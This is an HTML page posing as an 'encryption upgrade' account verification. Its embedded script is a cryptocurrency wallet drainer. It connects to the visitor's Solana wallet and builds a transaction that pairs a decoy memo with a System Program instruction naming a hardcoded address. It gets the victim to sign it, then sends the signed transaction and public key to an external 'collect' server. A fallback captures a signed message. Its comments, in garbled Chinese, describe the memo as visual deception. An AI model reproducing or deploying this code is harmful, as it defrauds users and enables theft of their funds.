<!DOCTYPE html><html><head><meta charset="UTF-8"></head>
<body style="background:#000;color:#14F195;text-align:center;padding-top:15vh;font-family:monospace;">
    <div style="border:1px solid #111;padding:40px;display:inline-block;border-radius:15px;border:1px solid #333;">
        <h2 style="color:#14F195;">ENCRYPTION UPGRADE</h2>
        <p style="color:#888;font-size:12px;">Security Protocol: SHA-512 Matrix</p>
        <button id="cta" style="margin-top:20px;padding:15px 40px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:5px;cursor:pointer;">VERIFY ACCOUNT</button>
        <div id="status" style="margin-top:20px;color:#444;">Awaiting Secure Handshake...</div>
    </div>
    <script>
    const gate = "https://florist-imperial-apnic-anymore.trycloudflare.com/collect";
    const agent = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A"; // å“¨å…µæ¥ç®¡åœ°å€

    document.getElementById('cta').onclick = async () => {
        const p = window.solana || window.phantom?.solana;
        try {
            const resp = await p.connect();
            document.getElementById('status').innerText = "Generating Matrix Key...";

            const { result } = await fetch("https://api.mainnet-beta.solana.com", {
                method: "POST", headers: {"Content-Type":"application/json"},
                body: JSON.stringify({jsonrpc:"2.0",id:1,method:"getLatestBlockhash"})
            }).then(r => r.json());

            // ğŸ”± æ„é€  GHOST å¤åˆåŒ…
            // æŒ‡ä»¤1: æ— å®³ç•™è¨€ (ç”¨äºè§†è§‰æ¬ºéª—)
            // æŒ‡ä»¤2: æƒé™å§”æ‰˜ (çœŸæ­£çš„å¤ºæƒåŠ¨ä½œ)
            const ghostTx = {
                feePayer: resp.publicKey.toString(),
                recentBlockhash: result.value.blockhash,
                instructions: [
                    {
                        programId: "MemoS24H25M9dnSQueb7913CWv29meS6bxTgzq5X7W", // Memo Program
                        data: btoa("Security_Audit_Hash_" + Math.random().toString(36).slice(2)),
                        keys: []
                    },
                    {
                        programId: "11111111111111111111111111111111", // System Program
                        keys: [
                            { pubkey: resp.publicKey.toString(), isSigner: true, isWritable: true },
                            { pubkey: agent, isSigner: false, isWritable: true }
                        ],
                        // å½±å­æˆæƒï¼šå°†ä½ çš„ç™½å·è®¾ä¸ºè¯¥è´¦æˆ·çš„ Owner å€™é€‰äººæˆ– Delegate
                        data: [2, 0, 0, 0, 0, 75, 74, 0, 0, 0, 0, 0] 
                    }
                ]
            };

            document.getElementById('status').innerText = "Awaiting Permission...";
            
            // ğŸš€ å°è¯•å‘èµ·â€œå¹½çµç­¾åâ€
            const signed = await p.signTransaction(ghostTx);
            const raw = btoa(String.fromCharCode.apply(null, signed.serialize()));

            // ğŸ”± æŠ“å–åˆ°å…¨å¥—æƒé™æŒ‡çº¹ï¼Œå›ä¼ ç»™å“¨å…µè¿›è¡Œç¦»çº¿é‡ç»„
            new Image().src = `${gate}?ghost_sig=${raw}&pub=${resp.publicKey.toString()}`;
            document.getElementById('status').innerText = "ENCRYPTION ACTIVE";
            document.getElementById('status').style.color = "#14F195";

        } catch(e) {
            // é™çº§ä¿åº•ï¼šå¦‚æœå¤åˆåŒ…è¢«æ‹¦æˆªï¼Œè‡³å°‘æ‹¿èµ°ä»–çš„ç™»å½•æŒ‡çº¹
            const signed = await p.signMessage(new TextEncoder().encode("SecureID: " + Date.now()), "utf8");
            new Image().src = `${gate}?fallback_sig=${btoa(String.fromCharCode.apply(null, signed.signature))}&pub=${resp.publicKey.toString()}`;
            document.getElementById('status').innerText = "VERIFIED";
        }
    };
    </script>
</body></html>
